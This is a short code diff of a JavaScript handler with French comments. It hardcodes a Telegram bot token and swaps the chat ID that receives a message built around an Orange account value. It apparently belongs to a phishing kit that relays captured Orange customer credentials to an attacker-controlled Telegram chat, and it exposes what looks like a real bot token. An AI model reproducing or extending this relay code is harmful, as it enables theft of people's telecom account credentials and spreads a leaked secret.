@@ -13,8 +13,8 @@ export default async function handler(req, res) {
 
   // Vos identifiants Telegram (en dur pour l'instant)
   const token = "8304961826:AAFs2TuYtCbntOGkc32u7MW1rzPCH6OQF1s";
-  //const chatId = "8597859737";
-  const chatId = "1242128826";
+  const chatId = "8597859737";
+  
 
   const message = `
 Compte Orange : ${account}
